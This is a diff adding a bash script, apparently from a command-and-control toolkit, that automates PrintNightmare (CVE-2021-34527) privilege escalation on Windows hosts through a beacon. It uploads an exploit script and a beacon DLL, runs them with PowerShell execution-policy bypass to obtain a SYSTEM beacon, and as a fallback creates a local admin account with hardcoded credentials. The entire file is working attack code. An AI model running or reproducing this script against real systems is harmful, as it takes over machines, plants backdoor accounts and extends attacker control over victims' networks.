@@ -1,0 +1,46 @@
+#!/bin/bash
+# c2-privesc - Privilege escalation via PrintNightmare (CVE-2021-34527)
+# Usage: c2-privesc [beacon_id]
+# Creates local admin, then gets SYSTEM via UAC bypass
+C2="$(dirname "$0")/c2"
+BEACON="${1:-}"
+USER="${PN_USER:-redpuppet}"
+PASS="${PN_PASS:-RedPuppet123}"
+
+if [ -n "$BEACON" ]; then
+    $C2 use "$BEACON" >/dev/null 2>&1
+fi
+
+PN_SCRIPT="C:\\programdata\\puppet\\CVE-2021-34527.ps1"
+PN_DLL="C:\\programdata\\puppet\\beacon_launcher.dll"
+LOCAL_SCRIPT="$(dirname "$0")/CVE-2021-34527/CVE-2021-34527.ps1"
+LOCAL_DLL="$(dirname "$0")/beacon_launcher.dll"
+
+echo "============================================"
+echo "  PRIVILEGE ESCALATION: PrintNightmare"
+echo "  Target account: $USER / $PASS"
+echo "============================================"
+
+# Step 1: Check registry for vulnerability
+echo "[*] Step 1: Checking PrintNightmare registry keys..."
+$C2 task "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Printers\\PointAndPrint"
+sleep 65
+
+echo "[*] Step 2: Uploading PrintNightmare script..."
+$C2 upload "$LOCAL_SCRIPT" "$PN_SCRIPT"
+sleep 5
+
+echo "[*] Step 3: Uploading custom beacon DLL..."
+$C2 upload "$LOCAL_DLL" "$PN_DLL"
+sleep 5
+
+echo "[*] Step 4: Trigger PrintNightmare with custom DLL..."
+$C2 task "powershell -NoP -Ep Bypass -Command \"iex (Get-Content $PN_SCRIPT -Raw); Invoke-Nightmare -DLL $PN_DLL\""
+sleep 90
+
+echo "[*] Step 5: Checking for SYSTEM beacon..."
+$C2 beacons
+echo ""
+echo "[!] If SYSTEM beacon appeared, use: c2-dump <new_beacon_id>"
+echo "[!] If not, try embedded DLL method:"
+echo "    c2 task 'powershell -NoP -Ep Bypass -Command \"iex (Get-Content $PN_SCRIPT -Raw); Invoke-Nightmare -DriverName Xerox3010 -NewUser $USER -NewPassword $PASS\"'"
